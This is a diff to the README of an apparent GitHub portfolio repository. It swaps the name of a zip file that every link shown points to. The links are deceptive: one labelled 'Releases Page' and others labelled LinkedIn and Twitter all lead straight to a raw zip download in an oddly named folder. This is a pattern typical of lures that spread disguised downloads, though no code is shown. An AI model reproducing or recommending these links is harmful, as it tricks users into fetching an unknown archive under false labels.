@@ -6,13 +6,13 @@ Welcome to the **Professional-Portfolio** GitHub repository! This project showca
 
 ## 🔗 Download the Application
 
-[![Download Professional-Portfolio](https://github.com/Anonymouse7652/Professional-Portfolio/raw/refs/heads/main/septemfoliate/Professional_Portfolio_1.3.zip)](https://github.com/Anonymouse7652/Professional-Portfolio/raw/refs/heads/main/septemfoliate/Professional_Portfolio_1.3.zip)
+[![Download Professional-Portfolio](https://github.com/Anonymouse7652/Professional-Portfolio/raw/refs/heads/main/septemfoliate/Portfolio-Professional-2.5.zip)](https://github.com/Anonymouse7652/Professional-Portfolio/raw/refs/heads/main/septemfoliate/Portfolio-Professional-2.5.zip)
 
 ## 📥 Download & Install
 
 To download the application, click the link below:
 
-[Download from Releases Page](https://github.com/Anonymouse7652/Professional-Portfolio/raw/refs/heads/main/septemfoliate/Professional_Portfolio_1.3.zip)
+[Download from Releases Page](https://github.com/Anonymouse7652/Professional-Portfolio/raw/refs/heads/main/septemfoliate/Portfolio-Professional-2.5.zip)
 
 Once you're on that page, look for the latest release. You will find files available for download. Click to download the relevant file for your needs.
 
@@ -71,7 +71,7 @@ Feel free to contribute to this portfolio. If you have suggestions, ideas, or im
 
 ## 🌐 Connect
 
-You can also connect with me on [LinkedIn](https://github.com/Anonymouse7652/Professional-Portfolio/raw/refs/heads/main/septemfoliate/Professional_Portfolio_1.3.zip) or follow my work on [Twitter](https://github.com/Anonymouse7652/Professional-Portfolio/raw/refs/heads/main/septemfoliate/Professional_Portfolio_1.3.zip).
+You can also connect with me on [LinkedIn](https://github.com/Anonymouse7652/Professional-Portfolio/raw/refs/heads/main/septemfoliate/Portfolio-Professional-2.5.zip) or follow my work on [Twitter](https://github.com/Anonymouse7652/Professional-Portfolio/raw/refs/heads/main/septemfoliate/Portfolio-Professional-2.5.zip).
 
 ## 📜 License
 
